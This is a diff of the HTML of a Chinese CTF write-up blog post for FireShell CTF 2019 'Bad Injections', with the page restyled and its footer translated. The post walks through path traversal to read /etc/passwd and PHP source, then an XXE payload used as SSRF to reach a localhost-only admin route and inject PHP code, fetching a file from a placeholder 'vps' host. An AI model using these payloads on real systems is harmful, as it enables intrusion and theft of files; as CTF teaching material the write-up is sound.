@@ -118,64 +118,168 @@
 <p>给个本地web目录</p>
 <p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
 <p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</span><br></pre></td></tr></table></figure>
-
-<p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
+<pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
 <p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
 <p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
 <p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</span><br></pre></td></tr></table></figure>
-
-<p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
+<pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
 <p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
 <p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</span><br></pre></td></tr></table></figure>
+<pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p>
+<pre><code>&lt;?php
+ini_set(&#39;display_errors&#39;,1);
+ini_set(&#39;display_startup_erros&#39;,1);
+error_reporting(E_ALL);
+require_once(&#39;Routes.php&#39;);
 
-<p>/app/index.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;display_errors&apos;,1);</span><br><span class="line">ini_set(&apos;display_startup_erros&apos;,1);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">require_once(&apos;Routes.php&apos;);</span><br><span class="line"></span><br><span class="line">function __autoload($class_name)&#123;</span><br><span class="line">  if(file_exists(&apos;./classes/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./classes/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;else if(file_exists(&apos;./Controllers/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./Controllers/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+function __autoload($class_name){
+  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){
+    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;
+  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){
+    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;
+  }
 
-<p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index.php&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;about-us&apos;,function()&#123;</span><br><span class="line">  AboutUs::createView(&apos;AboutUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;contact-us&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;ContactUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;list&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;Lista&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify&apos;,function()&#123;   </span><br><span class="line">  if(!isset($_GET[&apos;file&apos;]) &amp;&amp; !isset($_GET[&apos;hash&apos;]))&#123;</span><br><span class="line">    Verify::createView(&apos;Verify&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Verify::verifyFile($_GET[&apos;file&apos;],$_GET[&apos;hash&apos;]);  //设置session，file和hash对应请求文件</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;download&apos;,function()&#123;</span><br><span class="line">  if(isset($_REQUEST[&apos;file&apos;]) &amp;&amp; isset($_REQUEST[&apos;hash&apos;]))&#123;</span><br><span class="line">    echo Download::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo &apos;jdas&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify/download&apos;,function()&#123;</span><br><span class="line">  Verify::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); // xml</span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom/sort&apos;,function()&#123;</span><br><span class="line">  Custom::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line"> Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
+<pre><code>&lt;?php
 
-<p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+Route::set(&#39;index.php&#39;,function(){
+  Index::createView(&#39;Index&#39;);
+});
 
-<p>找一下其他利用，再看Custom</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); </span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+Route::set(&#39;index&#39;,function(){
+  Index::createView(&#39;Index&#39;);
+});
 
-<p>Custom::Test</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Custom extends Controller&#123;</span><br><span class="line">  public static function Test($string)&#123;</span><br><span class="line">      $root = simplexml_load_string($string,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">      $test = $root-&gt;name;</span><br><span class="line">      echo $test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+Route::set(&#39;about-us&#39;,function(){
+  AboutUs::createView(&#39;AboutUs&#39;);
+});
 
-<p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
+Route::set(&#39;contact-us&#39;,function(){
+  ContactUs::createView(&#39;ContactUs&#39;);
+});
+
+Route::set(&#39;list&#39;,function(){
+  ContactUs::createView(&#39;Lista&#39;);
+});
+
+Route::set(&#39;verify&#39;,function(){   
+  if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){
+    Verify::createView(&#39;Verify&#39;);
+  }else{
+    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件
+  }
+});
+
+
+Route::set(&#39;download&#39;,function(){
+  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){
+    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
+  }else{
+    echo &#39;jdas&#39;;
+  }
+});
+
+Route::set(&#39;verify/download&#39;,function(){
+  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);
+});
+
+
+Route::set(&#39;custom&#39;,function(){
+  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
+  $data = stream_get_contents($handler); // xml
+  if(strlen($data) &gt; 1){
+    Custom::Test($data);
+  }else{
+    Custom::createView(&#39;Custom&#39;);
+  }
+});
+
+Route::set(&#39;admin&#39;,function(){
+  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
+    Admin::createView(&#39;Admin&#39;);
+  }else{
+    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
+      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+    }else{
+     echo &quot;;(&quot;;
+    }
+  }
+});
+
+Route::set(&#39;custom/sort&#39;,function(){
+  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+});
+Route::set(&#39;index&#39;,function(){
+ Index::createView(&#39;Index&#39;);
+});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
+<pre><code>Route::set(&#39;admin&#39;,function(){
+  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
+    Admin::createView(&#39;Admin&#39;);
+  }else{
+    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
+      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
+    }else{
+     echo &quot;;(&quot;;
+    }
+  }
+});</code></pre><p>找一下其他利用，再看Custom</p>
+<pre><code>Route::set(&#39;custom&#39;,function(){
+  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
+  $data = stream_get_contents($handler); 
+  if(strlen($data) &gt; 1){
+    Custom::Test($data);
+  }else{
+    Custom::createView(&#39;Custom&#39;);
+  }
+});</code></pre><p>Custom::Test</p>
+<pre><code>class Custom extends Controller{
+  public static function Test($string){
+      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);
+      $test = $root-&gt;name;
+      echo $test;
+  }
+}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
 <p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
 <p>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
+&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;
+&lt;note&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
 <p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
 <p><code>http://vps/xxe.txt</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@hpdoger.me&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@souhu.com&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>POC</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;root&gt;
+&lt;channel&gt;
+&lt;item&gt;
+&lt;link&gt;@hpdoger.me&lt;/link&gt;
+&lt;/item&gt;
+&lt;item&gt;
+&lt;link&gt;@souhu.com&lt;/link&gt;
+&lt;/item&gt;
+&lt;/channel&gt;
+&lt;/root&gt;</code></pre><p><code>POC</code></p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
+&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;
+&lt;note&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
 
             </div>
           
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -188,7 +292,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
